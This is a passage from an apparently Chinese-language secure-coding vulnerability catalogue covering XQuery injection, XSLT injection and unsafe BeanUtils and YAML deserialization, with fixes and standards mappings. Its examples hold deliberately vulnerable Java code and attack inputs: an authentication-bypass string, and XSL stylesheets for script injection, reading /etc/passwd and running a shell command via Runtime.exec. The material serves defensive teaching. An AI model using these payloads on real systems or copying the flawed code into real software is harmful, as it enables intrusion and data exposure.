<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium 24 + 2 XPath Injection</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 XPath Injection (WASC-39)</p>
<h4 id="XQuery-Injection"><a href="#XQuery-Injection" class="headerlink" title="XQuery Injection"></a>XQuery Injection</h4><h5 id="ABSTRACT-349"><a href="#ABSTRACT-349" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过利用用户输入构建动态 XQuery 表达式，攻击者就能够修改指令的含义。</p>
<h5 id="EXPLANATION-349"><a href="#EXPLANATION-349" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>XQuery injection 会在以下情况中出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态构造一个 XQuery 表达式。</p>
</li>
</ol>
<p>例 1：下列代码能够动态地构建和执行 XQuery 表达式，用来根据给定的用户名和密码组合检索出用户。由于用户名和密码通过 HTTP 请求读取，因而是不可信的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">XQDataSource xqs = new XQDataSource();</span><br><span class="line"></span><br><span class="line">XQConnection conn = xqs.getConnection();</span><br><span class="line"></span><br><span class="line">String query = &quot;for \$user in doc(users.xml)//user[username=&apos;&quot; + request.getParameter(&quot;username&quot;) + &quot;&apos;and pass=&apos;&quot; + request.getParameter(&quot;password&quot;) + &quot;&apos;] return \$user&quot;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">XQPreparedExpression xqpe = conn.prepareExpression(query);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">XQResultSequence rs = xqpe.executeQuery();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在正常情况下，诸如搜索采用相应用户名和密码的用户，该代码执行的表达式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for \$user in doc(users.xml)//user[username=&apos;test_user&apos; and pass=&apos;pass123&apos;] return \$user</span><br></pre></td></tr></table></figure>
<p>但是，由于这个表达式是动态构造的，由一个常数基查询字符串和一个用户输入字符串连接而成，因此只有在 username 或 password 不包含单引号字符时，才会正确执行这一查询。如果攻击者为 username 输入字符串 admin’ or 1=1 or ‘’=’，则该查询会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for \$user in doc(users.xml)//user[username=&apos;admin&apos; or 1=1 or &apos;&apos;=&apos;&apos; and password=&apos;x&apos; or &apos;&apos;=&apos;&apos;] return \$user</span><br></pre></td></tr></table></figure>
<p>添加条件 admin’ or 1=1 or ‘’=’ 会使 XQuery 表达式永远评估为 true。因此，该查询在逻辑上等同于更简单的查询：</p>
<p><code>//user[username=&#39;admin&#39;]</code></p>
<p>如此简化的查询会使攻击者绕过查询与密码匹配的要求；现在查询会返回文档中存储的管理用户，无论输入什么样的密码。</p>
<h5 id="RECOMMENDATIONS-348"><a href="#RECOMMENDATIONS-348" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 XQuery injection 漏洞的根本原因在于攻击者能够改变 XQuery 表达式查询的上下文，导致程序员期望解释为数据的某个数值最终被解释为命令。构建 XQuery 表达式后，程序员知道哪些数值应解释为命令的一部分，哪些数值应解释为数据。</p>
<p>要防止攻击者违背程序员预期，请使用准备好的表达式绑定用户控制的参数至查询变量中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">XQDataSource xqs = new XQDataSource();</span><br><span class="line"></span><br><span class="line">XQConnection conn = xqs.getConnection();</span><br><span class="line"></span><br><span class="line">String query = &quot;declare variable $username as xs:string external; declare variable $password as xs:string external; for \$user in doc(users.xml)//user[username=&apos;$username&apos; and pass=&apos;$password&apos;] return \$user&quot;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">XQPreparedExpression xqpe = conn.prepareExpression(query);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">xqpe.bindString(new QName(&quot;username&quot;), request.getParameter(&quot;username&quot;), null);</span><br><span class="line"></span><br><span class="line">xqpe.bindString(new QName(&quot;password&quot;), request.getParameter(&quot;password&quot;), null);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">XQResultSequence rs = xqpe.executeQuery();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-347"><a href="#REFERENCES-347" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 652</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 XQuery Injection (WASC-46)</p>
<h4 id="XSLT-Injection"><a href="#XSLT-Injection" class="headerlink" title="XSLT Injection"></a>XSLT Injection</h4><h5 id="ABSTRACT-350"><a href="#ABSTRACT-350" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果处理未验证的 XSL 样式表，可能会使攻击者修改得到的 XML 的结构和内容，从文件系统中加入任意文件，或者执行任意 Java 代码。</p>
<h5 id="EXPLANATION-350"><a href="#EXPLANATION-350" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>XSLT injection 会在以下情况中出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据写入到 XSL 样式表中。</p>
</li>
</ol>
<p>通常，应用程序利用 XSL 样式表来转换 XML 文档的格式。XSL 样式表中包括特殊函数，虽然此类函数能改善转换进程，但如果使用不当也会带来更多漏洞。</p>
<p>如果攻击者能够在样式表中写入 XSL 元素，则可以更改 XSL 样式表和处理的语义。攻击者可能会更改样式表的输出，使 XSS (cross-site scripting) 攻击被启用，暴露本地文件系统资源的内容，或者执行任意 Java 命令。</p>
<p>例 1：下面是一些易受 XSLT 注入攻击的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">InputStream xmlUrl = Utils.getFromURL(request.getParameter(&quot;xmlurl&quot;));</span><br><span class="line"></span><br><span class="line">InputStream xsltUrl = Utils.getFromURL(request.getParameter(&quot;xslurl&quot;));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Source xmlSource = new StreamSource(xmlUrl);</span><br><span class="line"></span><br><span class="line">Source xsltSource = new StreamSource(xsltUrl);</span><br><span class="line"></span><br><span class="line">Result result = new StreamResult(System.out);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">TransformerFactory transFact = TransformerFactory.newInstance();</span><br><span class="line"></span><br><span class="line">Transformer trans = transFact.newTransformer(xsltSource);</span><br><span class="line"></span><br><span class="line">trans.transform(xmlSource, result);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>当攻击者能将标识的 XSL 送入 XSTL 处理器时，上述代码会导致三种不同的攻击：</p>
<ol>
<li>XSS：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;alert(123)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/xsl:template&gt;</span><br><span class="line"></span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
<p>在处理 XSL 样式表时，<code>&lt;script&gt;</code> 会进入受害者的浏览器，从而能够实施 cross-site scripting 攻击。</p>
<ol>
<li>读取服务器文件系统中的任意文件：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;xsl:copy-of select=&quot;document(&apos;/etc/passwd&apos;)&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/xsl:template&gt;</span><br><span class="line"></span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
<p>上述 XSL 样式表将返回 /etc/passwd 文件的内容。</p>
<ol>
<li>执行任意 Java 代码：</li>
</ol>
<p>XSLT 处理器如果不禁用，能将本机 Java 语言方法暴露为 XSLT 函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot; xmlns:ob=&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;xsl:variable name=&quot;rtobject&quot; select=&quot;rt:getRuntime()&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtobject,&apos;ls&apos;)&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;xsl:variable name=&quot;processString&quot; select=&quot;ob:toString($process)&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;xsl:value-of select=&quot;$processString&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/xsl:template&gt;</span><br><span class="line"></span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
<p>上述样式表将执行服务器上运行的“ls”命令。</p>
<h5 id="RECOMMENDATIONS-349"><a href="#RECOMMENDATIONS-349" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将用户提供的数据写入 XSL 样式表时，应该遵守以下准则：</p>
<ol>
<li><p>根据已知的正常值验证输入和白名单。</p>
</li>
<li><p>写入到 XML 之前，先对用户输入进行 XML 实体编码。</p>
</li>
<li><p>如果不需要，请禁用扩展函数。例如，在 JAXP 中，通过将“安全处理”功能设置为 true，就可能实现，设置方法如下：</p>
<p> <code>transFact.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</code></p>
</li>
</ol>
<h5 id="REFERENCES-348"><a href="#REFERENCES-348" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INJECT-8: Take care interpreting untrusted code Oracle</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 494, CWE ID 631</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-Unsafe-BeanUtils-Deserialization"><a href="#Dynamic-Code-Evaluation-Unsafe-BeanUtils-Deserialization" class="headerlink" title="Dynamic Code Evaluation: Unsafe BeanUtils Deserialization"></a>Dynamic Code Evaluation: Unsafe BeanUtils Deserialization</h4><h5 id="ABSTRACT-351"><a href="#ABSTRACT-351" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 BeanUtils 对用户控制的对象进行反序列化，可能允许攻击者在服务器上执行任意代码、滥用应用程序逻辑和/或导致拒绝服务。</p>
<h5 id="EXPLANATION-351"><a href="#EXPLANATION-351" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>BeanUtils 用于反序列化用户控制的数据，在本例中为 Redis Hash，它包含要分配给对象字段的类型鉴别器和值。 BeanUtils 通过调用这些字段的资源库重构对象，允许攻击者将任意数据传递给任意类资源库。 如果攻击者可以指定要重构的对象类，并能够强制应用程序运行具有用户控制的数据的任意资源库，则在 Redis Hash 反序列化期间他们也许能够执行任意代码。</p>
<p>例 1：以下代码使用 BeanUtilsHashMapper 反序列化 Redis Hash，这可能允许攻击者控制此类 Hash 来运行任意代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMapper&lt;Person, String, String&gt; hashMapper = new BeanUtilsHashMapper&lt;Person&gt;(Person.class);</span><br><span class="line"></span><br><span class="line">Person p = hashMapper.fromHash(untrusted_map);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-350"><a href="#RECOMMENDATIONS-350" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可能，在没有验证 Redis Hash 内容的情况下，请勿对不受信任的数据进行反序列化。 改用安全的 HashMapper（例如 ObjectHashMapper），它不调用资源库，而是使用 Reflection 重构对象。</p>
<p>示例 2： 以下代码使用 ObjectHashMapper 反序列化 Redis Hash。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectHashMapper hashMapper = new ObjectHashMapper();</span><br><span class="line"></span><br><span class="line">Person p = (Person) hashMapper.fromHash(untrusted_map);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-349"><a href="#REFERENCES-349" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 502 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [23] CWE ID 502 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001764, CCI-001774, CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.5.2 Input and Output Architectural Requirements, 5.5.1 Deserialization Prevention Requirements, 5.5.3 Deserialization Prevention Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A8 Insecure Deserialization </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[23] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116 </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Dynamic-Code-Evaluation-Unsafe-YAML-Deserialization"><a href="#Dynamic-Code-Evaluation-Unsafe-YAML-Deserialization" class="headerlink" title="Dynamic Code Evaluation: Unsafe YAML Deserialization"></a>Dynamic Code Evaluation: Unsafe YAML Deserialization</h4><h5 id="ABSTRACT-352"><a href="#ABSTRACT-352" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>对用户控制的 YAML 流进行反序列化，可能会让攻击者有机会在服务器上执行任意代码、滥用应用程序逻辑和/或导致拒绝服务。</p>
<h5 id="EXPLANATION-352"><a href="#EXPLANATION-352" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>将对象图转换为 YAML 格式数据的 YAML 序列化库可能包括重新从 YAML 流重构对象所需的元数据。 如果攻击者可以指定要重构的对象类，并能够强制应用程序运行具有用户控制数据的任意资源库，则在 YAML 流的反序列化期间，他们也许能够执行任意代码。</p>
<h5 id="RECOMMENDATIONS-351"><a href="#RECOMMENDATIONS-351" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可能，在没有验证 YAML 流的内容的情况下，请勿对不受信任的数据进行反序列化。 根据所用的 YAML 库，也许可以将反序列化过程中构造的类列入白名单。</p>
<h5 id="REFERENCES-350"><a href="#REFERENCES-350" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 502 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [23] CWE ID 502 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001764, CCI-001774, CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.5.2 Input and Output Architectural Requirements, 5.5.1 Deserialization Prevention Requirements, 5.5.3 Deserialization Prevention Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A8 Insecure Deserialization </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[23] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116 </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
